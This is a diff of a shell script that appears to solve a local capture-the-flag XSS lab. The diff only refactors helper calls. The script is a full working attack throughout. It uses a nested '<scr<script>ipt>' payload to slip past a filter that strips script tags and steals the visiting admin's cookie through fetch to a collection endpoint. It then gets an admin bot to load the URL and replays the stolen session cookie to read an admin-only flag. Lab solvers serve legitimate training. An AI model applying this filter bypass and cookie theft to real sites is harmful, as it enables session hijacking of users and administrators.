@@ -7,21 +7,21 @@ URL="${1:?usage: $0 http://127.0.0.1:9200}"
 new_session lab20
 ID="drop$$"
 
-"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
+open_lab "$SESSION" "$URL/"
 
 # `<scr<script>ipt>` — the filter deletes the inner `<script>` and glues the
 # halves of the outer one back together.
 PAYLOAD="<scr<script>ipt>fetch('/collect?id=$ID&c='+encodeURIComponent(document.cookie))</script>"
 
 # Confirm the bypass survives the filter before spending the one report.
-send "$SESSION" req_0 --create --set path=/search --set "query.q=$PAYLOAD" | body |
+send "$SESSION" "$REQ0" --create --set path=/search --set "query.q=$PAYLOAD" | body |
     grep -o "<script>" >/dev/null || { echo "filter not bypassed"; exit 1; }
 
 TARGET="$URL/search?q=$(python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1]))' "$PAYLOAD")"
-send "$SESSION" req_0 --create --set path=/report --set "query.url=$TARGET" >/dev/null
+send "$SESSION" "$REQ0" --create --set path=/report --set "query.url=$TARGET" >/dev/null
 
 for _ in $(seq 1 30); do
-    COOKIE="$(send "$SESSION" req_0 --create --set path=/collected --set "query.id=$ID" | body |
+    COOKIE="$(send "$SESSION" "$REQ0" --create --set path=/collected --set "query.id=$ID" | body |
         python3 -c 'import json,sys,urllib.parse
 rows = json.load(sys.stdin)["rows"]
 for row in rows:
@@ -34,4 +34,4 @@ print("")')"
 done
 [ -n "$COOKIE" ] || { echo "the admin never called back"; exit 1; }
 
-send "$SESSION" req_0 --create --set path=/admin/flag --set "cookie.session=$COOKIE" | flag
+send "$SESSION" "$REQ0" --create --set path=/admin/flag --set "cookie.session=$COOKIE" | flag
